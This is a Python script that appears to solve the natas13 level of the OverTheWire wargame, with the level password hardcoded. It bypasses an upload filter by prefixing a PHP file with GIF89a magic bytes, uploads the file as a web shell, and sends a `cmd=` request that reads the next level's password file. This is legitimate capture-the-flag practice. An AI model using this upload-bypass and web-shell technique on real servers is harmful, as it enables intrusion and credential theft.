import requests
import re

user = 'natas13'
passw = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'
url = 'http://%s.natas.labs.overthewire.org/' % user



# 1st step:  print the sourcecode
'''
response = requests.get(url, auth=(user, passw))
print(response.text)
'''
# we can upload a file to the server, if we can inject a code inside the file and make it run on the server, we can get the pass of natas13

session1 = requests.Session()
# 2nd step:  uploading the fake jpg
'''
response = session1.post(url, files = { "uploadedfile" : open('fakejpg.jpg', 'rb') }, data = { "filename" : "fakejpg.php", "MAX_FILE_SIZE" : "1000" }, auth = (user, passw) )
print(response.text)
'''
# changing the extension to jpg did not work, we can change it's hex signature,
# or even easier: add "GIF89a" to the beginning of the php
# GIF89a is the signature for GIF

# 3rd step: add GIF89 to the beginning of the php


# 4th step:
'''
response = session1.post(url, files = { "uploadedfile" : open('fakejpg.php', 'rb') }, data = { "filename" : "fakejpg.php", "MAX_FILE_SIZE" : "1000" }, auth = (user, passw) )
print(response.text)
'''
# here is our file:
# upload/ja6rfnt3d7.php

# 5h step:
#'''
response = session1.get( url + 'upload/ja6rfnt3d7.php?cmd=cat /etc/natas_webpass/natas14', auth = (user, passw ))
webPage = response.text
matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, webPage)  # we know that the password has length of 32 chars and consisting of alphanum
# the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
print(matchObject.group())
#'''